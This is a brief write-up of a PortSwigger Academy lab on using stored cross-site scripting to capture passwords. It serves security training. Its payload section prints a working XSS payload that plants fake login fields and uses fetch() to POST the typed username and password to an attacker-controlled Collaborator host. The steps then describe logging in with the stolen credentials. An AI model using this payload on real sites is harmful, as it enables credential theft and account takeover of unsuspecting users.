# Lab: Exploiting cross-site scripting to capture passwords

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

## Lab idea

The stored-comment XSS is evaluated in a scenario where a simulated user views the comments, with the stated objective involving capture of account credentials. It practices understanding how XSS impact can extend beyond a harmless proof of execution to sensitive information exposure.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Using Burp Suite Professional, go to the Collaborator tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated: <input name=username id=username> <input type=password name=password…
4. Go back to the Collaborator tab, and click "Poll now".
5. Take a note of the value of the victim's username and password in the POST body.
6. Use the credentials to log in as the victim user.

## Payloads / key values
- `<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`

## Official source
- [PortSwigger Academy: Lab: Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
